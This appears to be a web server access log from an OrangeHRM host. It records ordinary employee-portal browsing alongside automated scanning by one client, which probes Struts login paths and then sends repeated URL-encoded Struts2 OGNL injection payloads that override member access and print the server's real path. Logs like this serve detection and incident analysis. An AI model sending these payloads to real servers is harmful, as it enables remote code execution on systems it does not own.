74.118.138.195 - - [12/Jul/2018:15:19:38 -0700] "GET /symfony/web/index.php/pim/viewMemberships/empNumber/1 HTTP/1.1" 200 66589 "http://74.118.139.108/symfony/web/index.php/pim/viewReportToDetails/empNumber/1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:19:40 -0700] "GET /symfony/web/webres_5acde3dbd3adc6.90334155/orangehrmPimPlugin/js/viewMembershipsSuccess.js HTTP/1.1" 200 6808 "http://74.118.139.108/symfony/web/index.php/pim/viewMemberships/empNumber/1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:19:40 -0700] "GET /symfony/web/index.php/pim/viewPhoto/empNumber/1 HTTP/1.1" 304 - "http://74.118.139.108/symfony/web/index.php/pim/viewMemberships/empNumber/1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:19:40 -0700] "GET /symfony/web/index.php/leave/getWorkWeekAjax?_=1531433980143 HTTP/1.1" 200 17 "http://74.118.139.108/symfony/web/index.php/pim/viewMemberships/empNumber/1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:19:40 -0700] "GET /symfony/web/index.php/leave/getHolidayAjax?year=2018&_=1531433980140 HTTP/1.1" 200 2 "http://74.118.139.108/symfony/web/index.php/pim/viewMemberships/empNumber/1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:19:45 -0700] "GET /symfony/web/index.php/pim/viewDependents/empNumber/1 HTTP/1.1" 200 62820 "http://74.118.139.108/symfony/web/index.php/pim/viewMemberships/empNumber/1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:19:46 -0700] "GET /symfony/web/index.php/pim/viewPhoto/empNumber/1 HTTP/1.1" 304 - "http://74.118.139.108/symfony/web/index.php/pim/viewDependents/empNumber/1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:19:46 -0700] "GET /symfony/web/index.php/leave/getHolidayAjax?year=2018&_=1531433986327 HTTP/1.1" 200 2 "http://74.118.139.108/symfony/web/index.php/pim/viewDependents/empNumber/1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:19:46 -0700] "GET /symfony/web/index.php/leave/getWorkWeekAjax?_=1531433986327 HTTP/1.1" 200 17 "http://74.118.139.108/symfony/web/index.php/pim/viewDependents/empNumber/1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:19:50 -0700] "GET /symfony/web/index.php/pim/viewEmergencyContacts/empNumber/1 HTTP/1.1" 200 61583 "http://74.118.139.108/symfony/web/index.php/pim/viewDependents/empNumber/1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:19:51 -0700] "GET /symfony/web/index.php/pim/viewPhoto/empNumber/1 HTTP/1.1" 304 - "http://74.118.139.108/symfony/web/index.php/pim/viewEmergencyContacts/empNumber/1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:20:09 -0700] "GET /symfony/web/index.php/pim/viewSalaryList/empNumber/1 HTTP/1.1" 200 54934 "http://74.118.139.108/symfony/web/index.php/pim/viewSalaryList/empNumber/1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
74.118.138.195 - - [12/Jul/2018:15:20:10 -0700] "GET /symfony/web/index.php/pim/viewPhoto/empNumber/1 HTTP/1.1" 304 - "http://74.118.139.108/symfony/web/index.php/pim/viewSalaryList/empNumber/1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
74.118.138.195 - - [12/Jul/2018:15:20:27 -0700] "GET /symfony/web/index.php/dashboard HTTP/1.1" 200 28610 "http://74.118.139.108/symfony/web/index.php/pim/viewSalaryList/empNumber/1" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
47.90.92.121 - - [12/Jul/2018:15:23:52 -0700] "GET / HTTP/1.1" 302 - "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
47.90.92.121 - - [12/Jul/2018:15:23:52 -0700] "GET /symfony/web/index.php/auth/login HTTP/1.1" 200 15029 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
47.90.92.121 - - [12/Jul/2018:15:23:54 -0700] "GET /index.action HTTP/1.1" 404 1058 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
47.90.92.121 - - [12/Jul/2018:15:23:56 -0700] "GET /login.action HTTP/1.1" 404 1058 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
47.90.92.121 - - [12/Jul/2018:15:23:58 -0700] "GET /index.do HTTP/1.1" 404 1058 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
47.90.92.121 - - [12/Jul/2018:15:24:00 -0700] "GET /index.jsp HTTP/1.1" 404 1058 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
47.90.92.121 - - [12/Jul/2018:15:24:02 -0700] "GET /login.do HTTP/1.1" 404 1058 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
47.90.92.121 - - [12/Jul/2018:15:24:04 -0700] "GET /login.jsp HTTP/1.1" 404 1058 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
47.90.92.121 - - [12/Jul/2018:15:24:07 -0700] "GET /main.jsp HTTP/1.1" 404 1058 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
47.90.92.121 - - [12/Jul/2018:15:24:09 -0700] "GET /default.jsp HTTP/1.1" 404 1058 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
47.90.92.121 - - [12/Jul/2018:15:24:12 -0700] "GET /register.jsp HTTP/1.1" 404 1058 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
47.90.92.121 - - [12/Jul/2018:15:24:16 -0700] "GET /login/login.jsp HTTP/1.1" 404 1058 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
47.90.92.121 - - [12/Jul/2018:15:24:20 -0700] "GET /login/indexAction.action HTTP/1.1" 404 1058 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
47.90.92.121 - - [12/Jul/2018:15:24:24 -0700] "GET /indexAction.action HTTP/1.1" 404 1058 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
47.90.92.121 - - [12/Jul/2018:15:24:29 -0700] "POST / HTTP/1.1" 302 - "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:24:33 -0700] "GET /symfony/web/index.php/auth/login HTTP/1.1" 200 15029 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:24:38 -0700] "POST /index.action HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:24:42 -0700] "POST /login.action HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:24:47 -0700] "POST /index.do HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:24:52 -0700] "POST /index.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:24:56 -0700] "POST /login.do HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:25:01 -0700] "POST /login.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:25:06 -0700] "POST /main.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:25:10 -0700] "POST /default.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:25:15 -0700] "POST /register.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:25:19 -0700] "POST /login/login.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:25:24 -0700] "POST /login/indexAction.action HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:25:28 -0700] "POST /indexAction.action HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:25:32 -0700] "POST / HTTP/1.1" 302 - "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:25:37 -0700] "GET /symfony/web/index.php/auth/login HTTP/1.1" 200 15029 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:25:42 -0700] "POST /index.action HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:25:47 -0700] "POST /login.action HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:25:52 -0700] "POST /index.do HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:25:57 -0700] "POST /index.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:26:02 -0700] "POST /login.do HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:26:06 -0700] "POST /login.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:26:10 -0700] "POST /main.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:26:14 -0700] "POST /default.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:26:19 -0700] "POST /register.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:26:23 -0700] "POST /login/login.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:26:29 -0700] "POST /login/indexAction.action HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
74.118.138.195 - - [12/Jul/2018:15:26:30 -0700] "GET /symfony/web/index.php/time/viewMyTimesheet HTTP/1.1" 200 39893 "http://74.118.139.108/symfony/web/index.php/dashboard" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
74.118.138.195 - - [12/Jul/2018:15:26:31 -0700] "GET /symfony/web/index.php/leave/getHolidayAjax?year=2018&_=1531434391453 HTTP/1.1" 200 2 "http://74.118.139.108/symfony/web/index.php/time/viewMyTimesheet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
74.118.138.195 - - [12/Jul/2018:15:26:31 -0700] "GET /symfony/web/index.php/leave/getWorkWeekAjax?_=1531434391458 HTTP/1.1" 200 17 "http://74.118.139.108/symfony/web/index.php/time/viewMyTimesheet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
47.90.92.121 - - [12/Jul/2018:15:26:33 -0700] "POST /indexAction.action HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:26:37 -0700] "POST / HTTP/1.1" 302 - "-" "python-requests/2.12.4"
74.118.138.195 - - [12/Jul/2018:15:26:37 -0700] "GET /symfony/web/index.php/leave/viewLeaveModule HTTP/1.1" 302 153 "http://74.118.139.108/symfony/web/index.php/time/viewMyTimesheet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
74.118.138.195 - - [12/Jul/2018:15:26:38 -0700] "GET /symfony/web/index.php/leave/showLeavePeriodNotDefinedWarning HTTP/1.1" 200 23010 "http://74.118.139.108/symfony/web/index.php/time/viewMyTimesheet" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
47.90.92.121 - - [12/Jul/2018:15:26:42 -0700] "GET /symfony/web/index.php/auth/login HTTP/1.1" 200 15029 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:26:47 -0700] "POST /index.action HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:26:52 -0700] "POST /login.action HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:26:56 -0700] "POST /index.do HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:27:01 -0700] "POST /index.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:27:05 -0700] "POST /login.do HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:27:10 -0700] "POST /login.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:27:15 -0700] "POST /main.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:27:20 -0700] "POST /default.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:27:24 -0700] "POST /register.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:27:28 -0700] "POST /login/login.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:27:33 -0700] "POST /login/indexAction.action HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:27:37 -0700] "POST /indexAction.action HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:27:41 -0700] "POST / HTTP/1.1" 302 - "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:27:46 -0700] "GET /symfony/web/index.php/auth/login HTTP/1.1" 200 15029 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:27:51 -0700] "POST /index.action HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:27:56 -0700] "POST /login.action HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:28:00 -0700] "POST /index.do HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:28:05 -0700] "POST /index.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:28:10 -0700] "POST /login.do HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:28:14 -0700] "POST /login.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:28:19 -0700] "POST /main.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:28:23 -0700] "POST /default.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:28:28 -0700] "POST /register.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:28:32 -0700] "POST /login/login.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:28:37 -0700] "POST /login/indexAction.action HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:28:42 -0700] "POST /indexAction.action HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:28:46 -0700] "POST / HTTP/1.1" 302 - "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:28:51 -0700] "GET /symfony/web/index.php/auth/login HTTP/1.1" 200 15029 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:28:56 -0700] "POST /index.action HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:29:01 -0700] "POST /login.action HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:29:06 -0700] "POST /index.do HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
74.118.138.195 - - [12/Jul/2018:15:29:09 -0700] "GET / HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
74.118.138.195 - - [12/Jul/2018:15:29:09 -0700] "GET /symfony/web/index.php/auth/login HTTP/1.1" 200 15029 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
47.90.92.121 - - [12/Jul/2018:15:29:10 -0700] "POST /index.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:29:15 -0700] "POST /login.do HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:29:20 -0700] "POST /login.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:29:24 -0700] "POST /main.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:29:29 -0700] "POST /default.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:29:33 -0700] "POST /register.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:29:38 -0700] "POST /login/login.jsp HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:29:42 -0700] "POST /login/indexAction.action HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:29:47 -0700] "POST /indexAction.action HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:29:52 -0700] "GET //%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=%2f HTTP/1.1" 403 1046 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:29:57 -0700] "GET /index.action/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=%2f HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:30:01 -0700] "GET /login.action/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=%2f HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:30:06 -0700] "GET /index.do/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=%2f HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:30:11 -0700] "GET /index.jsp/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=%2f HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:30:16 -0700] "GET /login.do/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=%2f HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:30:21 -0700] "GET /login.jsp/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=%2f HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:30:25 -0700] "GET /main.jsp/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=%2f HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:30:30 -0700] "GET /default.jsp/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=%2f HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:30:34 -0700] "GET /register.jsp/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=%2f HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:30:39 -0700] "GET /login/login.jsp/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=%2f HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:30:43 -0700] "GET /login/indexAction.action/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=%2f HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:30:49 -0700] "GET /indexAction.action/%28%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29%3f(%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23wr.println(%23req.getRealPath(%23parameters.pp%5B0%5D)),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&pp=%2f HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:30:55 -0700] "POST / HTTP/1.1" 302 - "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:31:02 -0700] "GET /symfony/web/index.php/auth/login HTTP/1.1" 200 15029 "-" "python-requests/2.12.4"
47.90.92.121 - - [12/Jul/2018:15:31:09 -0700] "POST /index.action HTTP/1.1" 404 1058 "-" "python-requests/2.12.4"
74.118.138.195 - - [12/Jul/2018:15:31:12 -0700] "POST /symfony/web/index.php/auth/validateCredentials HTTP/1.1" 302 124 "http://74.118.139.108/symfony/web/index.php/auth/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134"
